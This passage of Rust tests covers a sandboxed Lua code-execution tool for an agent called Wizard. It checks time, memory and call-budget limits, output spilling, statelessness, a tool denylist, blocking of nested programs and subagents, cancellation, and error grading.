        let ctx = ToolContext::new(&tmp.0);

        let started = Instant::now();
        let result = run_with_budget(&tool, &ctx, "print('a')\nwhile true do end", 1).await;
        assert!(
            started.elapsed() < Duration::from_secs(20),
            "the spin was not interrupted: {:?}",
            started.elapsed()
        );
        assert_eq!(kind_of(&result), "time", "{}", body_of(&result));
        let body = body_of(&result);
        assert!(body.contains('a'), "the print survived the timeout: {body}");
        assert!(!matches!(result, Err(ToolError::Timeout { .. })));
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn an_allocating_program_hits_the_memory_bound() {
        let tmp = TempDir::new("greedy");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let result = run_with_budget(&tool, &ctx, GREEDY, 60).await;
        assert_eq!(kind_of(&result), "memory", "{}", body_of(&result));
    }

    /// The bound neither of the other two catches: a loop of individually fast
    /// calls finishes inside the deadline (which does not count parked time at
    /// all) and allocates nothing.
    #[tokio::test(flavor = "multi_thread")]
    async fn the_call_budget_bounds_a_loop() {
        let tmp = TempDir::new("budget");
        let probe = Arc::new(Probe::new("probe"));
        let calls = Arc::clone(&probe.calls);
        let tool = RunCodeTool::new(registry(vec![probe]), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let result = run_with_budget(&tool, &ctx, "for i = 1, 10000 do tool.probe{} end", 60).await;
        assert_eq!(kind_of(&result), "calls", "{}", body_of(&result));
        assert_eq!(
            calls.load(Ordering::SeqCst),
            CALL_BUDGET,
            "exactly the budget was dispatched, and the next one never reached the pump"
        );
    }

    /// A program that printed more than the cap *succeeded*. The spill sink
    /// turns the overflow into a success carrying a path; marking it a failure
    /// would teach the model that a correct program was wrong.
    #[tokio::test(flavor = "multi_thread")]
    async fn output_overflow_is_not_a_failure() {
        let tmp = TempDir::new("overflow");
        let sink = crate::tools::spill::SpillSink::in_dir(tmp.path("spill"));
        let dir = sink.dir().to_path_buf();
        let _hold = crate::tools::spill::hold_sink(Some(sink));

        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);
        let result = run(&tool, &ctx, "print(string.rep('x', 60000))\nprint('TAIL')").await;

        let output = result.expect("an overflowing program still succeeds");
        assert!(!output.is_error, "{}", output.content);
        assert!(
            output.content.starts_with("run_code ok"),
            "{}",
            output.content
        );
        assert!(
            output.content.contains("full result is at "),
            "the model is told where the rest is: {:.400}",
            output.content
        );
        let spilled = spilled_files(&dir);
        let whole: String = spilled
            .iter()
            .filter_map(|path| std::fs::read_to_string(path).ok())
            .collect();
        assert!(
            whole.contains("TAIL") && whole.len() > 60_000,
            "the whole text is on disk: {} bytes across {:?}",
            whole.len(),
            spilled
        );
    }

    /// Every file under `dir`, however deep the sink chose to nest them.
    fn spilled_files(dir: &Path) -> Vec<PathBuf> {
        let mut found = Vec::new();
        let Ok(entries) = std::fs::read_dir(dir) else {
            return found;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                found.extend(spilled_files(&path));
            } else {
                found.push(path);
            }
        }
        found
    }

    // -- the contract the description promises -----------------------------

    /// Nothing survives a call. The description says so in one sentence; this
    /// is that sentence asserted.
    #[tokio::test(flavor = "multi_thread")]
    async fn no_state_survives_between_two_calls() {
        let tmp = TempDir::new("stateless");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let first = run(
            &tool,
            &ctx,
            "x = 1\nfunction f() return 2 end\nprint('set')",
        )
        .await;
        assert_eq!(kind_of(&first), "ok", "{}", body_of(&first));

        let second = run(&tool, &ctx, "print(tostring(x), tostring(f))").await;
        let body = body_of(&second);
        assert!(
            body.contains("nil\tnil"),
            "a second call must start from nothing: {body}"
        );
    }

    /// The host surface is a rendering of the registry, not a curated list that
    /// drifts from it: a newly connected MCP server is callable with no Rust
    /// change, and a tool that went away leaves no stale binding.
    #[tokio::test(flavor = "multi_thread")]
    async fn the_host_surface_is_the_snapshot_minus_the_denylist() {
        let tmp = TempDir::new("roster");
        let inner = registry(vec![
            // Stands in for a freshly attached MCP tool: nothing in this file
            // names it, and it still has to be callable.
            Arc::new(Probe::new("server__click")),
            Arc::new(Probe::new("run_command")),
        ]);
        let expected: Vec<String> = inner
            .specs()
            .into_iter()
            .map(|spec| spec.function.name)
            .filter(|name| !PROGRAM_TOOL_DENYLIST.contains(&name.as_str()))
            .collect();
        assert!(
            expected.contains(&"server__click".to_string())
                && !expected.contains(&"run_command".to_string()),
            "the fixture has to exercise both halves: {expected:?}"
        );

        let tool = RunCodeTool::new(inner, hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);
        let result = run(
            &tool,
            &ctx,
            "for _, name in ipairs(wizard.tools()) do print(name) end",
        )
        .await;
        let body = body_of(&result);
        let listed: Vec<String> = body
            .lines()
            .skip_while(|line| *line != "output:")
            .skip(1)
            .map(str::to_string)
            .collect();
        assert_eq!(listed, expected, "{body}");

        // And a denylisted name is not merely absent from the roster, it is
        // refused where the model wrote it.
        let refused = run(&tool, &ctx, "tool.run_command{name = 'reload'}").await;
        assert!(
            body_of(&refused).contains("unknown tool 'run_command'"),
            "{}",
            body_of(&refused)
        );
    }

    /// Programs do not nest and cannot delegate, and neither is enforced by a
    /// check inside the program: both names are simply not in the snapshot.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_program_cannot_run_a_program_or_spawn_a_subagent() {
        let tmp = TempDir::new("nesting");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        for name in [RUN_CODE_TOOL_NAME, "spawn_subagent"] {
            let result = run(&tool, &ctx, &format!("tool.{name}{{}}")).await;
            let body = body_of(&result);
            assert!(
                body.contains(&format!("unknown tool '{name}'")),
                "{name}: {body}"
            );
            assert!(
                body.contains("wizard.tools()"),
                "the refusal points at the roster: {body}"
            );
        }
    }

    /// A tool a program calls runs unwired to the surface, mirroring
    /// `a_sub_run_declines_the_gates_a_turn_keeps`: `interview` and
    /// `exit_plan` decline in there rather than ask a question nobody is
    /// positioned to answer.
    #[tokio::test(flavor = "multi_thread")]
    async fn an_inner_call_is_not_wired_to_the_surface() {
        let tmp = TempDir::new("unwired");
        let probe = Arc::new(Probe::new("probe"));
        let saw = Arc::clone(&probe.saw_events);
        let tool = RunCodeTool::new(registry(vec![probe]), hooks(&tmp.0, Vec::new()));
        let (events, _rx) = tokio::sync::mpsc::channel(16);
        let ctx = ToolContext::new(&tmp.0).with_events(events);

        let result = run(&tool, &ctx, "tool.probe{}\ntool.probe{}").await;
        assert_eq!(kind_of(&result), "ok", "{}", body_of(&result));
        let saw = saw.lock().unwrap_or_else(PoisonError::into_inner).clone();
        assert_eq!(saw.len(), 2);
        assert!(
            saw.iter().all(|wired| !*wired),
            "a program's calls must not reach the parent's surface: {saw:?}"
        );
    }

    /// Depth-1 channel plus `&mut self` on `dispatch`: inner calls are
    /// serialized, and nothing in the design depends on them not being.
    #[tokio::test(flavor = "multi_thread")]
    async fn the_bridge_serializes_inner_calls() {
        let tmp = TempDir::new("serial");
        let mut probe = Probe::new("probe");
        probe.sleep_ms = 5;
        let probe = Arc::new(probe);
        let max = Arc::clone(&probe.max_in_flight);
        let calls = Arc::clone(&probe.calls);
        let tool = RunCodeTool::new(registry(vec![probe]), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);

        let result = run(&tool, &ctx, "for i = 1, 8 do tool.probe{} end").await;
        assert_eq!(kind_of(&result), "ok", "{}", body_of(&result));
        assert_eq!(calls.load(Ordering::SeqCst), 8);
        assert_eq!(max.load(Ordering::SeqCst), 1, "never two at once");
    }

    /// **The anti-hang test.** The pump goes away mid-program; the next call
    /// raises rather than parking the Lua thread on an answer that will never
    /// come, and the worker returns.
    ///
    /// This is the shape that would present as "Wizard freezes sometimes",
    /// which is the worst thing on the list to debug inside an agent loop.
    #[tokio::test(flavor = "multi_thread")]
    async fn the_worker_stops_when_the_pump_goes_away() {
        let tmp = TempDir::new("pumpgone");
        let (tx, mut requests) = mpsc::channel::<CallRequest>(1);
        let bounds = BoundsHandle::fixed(Duration::from_secs(30), MEMORY_LIMIT);
        let stop = Arc::clone(&bounds.stop);
        let worker = tokio::task::spawn_blocking({
            let cwd = tmp.0.clone();
            let denial = Arc::new(Mutex::new(None));
            move || {
                run_program(
                    "for i = 1, 100 do tool.probe{} end".to_string(),
                    cwd,
                    vec!["probe".to_string()],
                    tx,
                    bounds,
                    denial,
                    Arc::new(Mutex::new(String::new())),
                )
            }
        });

        // Answer exactly one call, then drop the receiver.
        let first = requests.recv().await.expect("the first call arrives");
        let _ = first.reply.send(Reply::Ran {
            content: "probe ok".to_string(),
            is_error: false,
        });
        drop(requests);

        let outcome = tokio::time::timeout(Duration::from_secs(10), worker)
            .await
            .expect("the worker must not hang when the pump is gone")
            .expect("and must not panic");
        assert!(
            matches!(outcome, ProgramOutcome::Threw { .. }),
            "the chunk unwinds instead of parking"
        );
        assert_eq!(
            StopReason::from_u8(stop.load(Ordering::SeqCst)),
            StopReason::Interrupted,
            "and says why, on the flag rather than in the message"
        );
    }

    /// Dropping the whole `execute` future must not leave a thread holding a
    /// clone of the parent's `ToolContext`.
    ///
    /// Measured on the context itself: the inner context is a clone, so its
    /// `Arc` fields carry an extra strong reference for exactly as long as the
    /// pump is alive. A leak here is invisible until a session has run for
    /// hours.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_dropped_future_does_not_leave_a_thread_holding_the_context() {
        let tmp = TempDir::new("dropped");
        let mut slow = Probe::new("slow");
        slow.sleep_ms = 5_000;
        let tool = RunCodeTool::new(registry(vec![Arc::new(slow)]), hooks(&tmp.0, Vec::new()));
        let ctx = ToolContext::new(&tmp.0);
        let baseline = Arc::strong_count(&ctx.tasks);

        let dropped =
            tokio::time::timeout(Duration::from_millis(250), run(&tool, &ctx, "tool.slow{}")).await;
        assert!(dropped.is_err(), "the future is dropped mid-call");

        let mut settled = false;
        for _ in 0..200 {
            if Arc::strong_count(&ctx.tasks) == baseline {
                settled = true;
                break;
            }
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
        assert!(
            settled,
            "the inner context outlived the dropped future: {} references, expected {baseline}",
            Arc::strong_count(&ctx.tasks)
        );
    }

    /// Ctrl-C reaches a program that is spinning in pure compute, where no
    /// tool call is in flight for the pump to refuse.
    #[tokio::test(flavor = "multi_thread")]
    async fn an_interrupted_program_unwinds_rather_than_wedging() {
        let tmp = TempDir::new("cancel");
        let tool = RunCodeTool::new(registry(Vec::new()), hooks(&tmp.0, Vec::new()));
        let cancel = CancelHandle::default();
        let ctx = ToolContext::new(&tmp.0).with_cancel(cancel.clone());

        let raiser = tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(150)).await;
            cancel.cancel();
        });
        let started = Instant::now();
        let result = run_with_budget(&tool, &ctx, "print('working')\nwhile true do end", 120).await;
        let _ = raiser.await;

        assert!(
            started.elapsed() < Duration::from_secs(20),
            "cancellation has to reach a spinning program: {:?}",
            started.elapsed()
        );
        assert_eq!(kind_of(&result), "interrupted", "{}", body_of(&result));
        assert!(body_of(&result).contains("working"));
    }

    /// The probe form never raises, for any grade, and reports the grade rather
    /// than a second taxonomy of its own.
    #[tokio::test(flavor = "multi_thread")]
    async fn wizard_call_reports_every_grade_without_raising() {
        let tmp = TempDir::new("probe");
        let mut refuse = Probe::new("refuse");
        refuse.fault = true;
        let mut reported = Probe::new("reported");
        reported.reported = true;
        let tool = RunCodeTool::new(
            registry(vec![
                Arc::new(refuse),
                Arc::new(reported),
                Arc::new(Probe::new("probe")),
            ]),
            hooks(&tmp.0, Vec::new()),
        );
        let ctx = ToolContext::new(&tmp.0);

        let result = run(
            &tool,
            &ctx,
            r#"
for _, name in ipairs({"probe", "reported", "refuse", "nope"}) do
  local r = wizard.call(name, {})
  print(name, tostring(r.ok), r.status)
end
"#,
        )
        .await;
        let body = body_of(&result);
        assert_eq!(kind_of(&result), "ok", "{body}");
        assert!(body.contains("probe\ttrue\tok"), "{body}");
        assert!(body.contains("reported\tfalse\treported"), "{body}");
        assert!(body.contains("refuse\tfalse\tdenied"), "{body}");
        assert!(body.contains("nope\tfalse\tdenied"), "{body}");
    }

    /// A tool that ran and reported failure comes back as `nil, message`, not a
    /// raise: a failing build is diagnostic signal and the program is allowed
    /// to read it and carry on.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_reported_failure_is_a_value_and_a_fault_is_a_raise() {
        let tmp = TempDir::new("grades");
        let mut reported = Probe::new("reported");
        reported.reported = true;
        let mut refuse = Probe::new("refuse");
        refuse.fault = true;
        let tool = RunCodeTool::new(
            registry(vec![Arc::new(reported), Arc::new(refuse)]),
            hooks(&tmp.0, Vec::new()),
        );
        let ctx = ToolContext::new(&tmp.0);

        let result = run(
            &tool,
            &ctx,
            r#"
local out, err = tool.reported{}
print("reported ->", tostring(out), err)
local ok, raised = pcall(function() return tool.refuse{} end)
print("fault raised ->", tostring(not ok))
"#,
        )
        .await;
        let body = body_of(&result);
        assert_eq!(kind_of(&result), "ok", "{body}");
        assert!(body.contains("reported ->\tnil\tthe probe ran"), "{body}");
        assert!(body.contains("fault raised ->\ttrue"), "{body}");
    }
}
